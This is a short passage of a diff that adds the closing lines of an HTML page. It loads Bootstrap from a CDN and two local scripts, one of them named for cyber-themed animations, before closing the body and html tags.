+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="../../assets/js/script.js"></script>
+    <script src="../../assets/js/cyber-animations.js"></script>
+
+</body>
+
+</html>
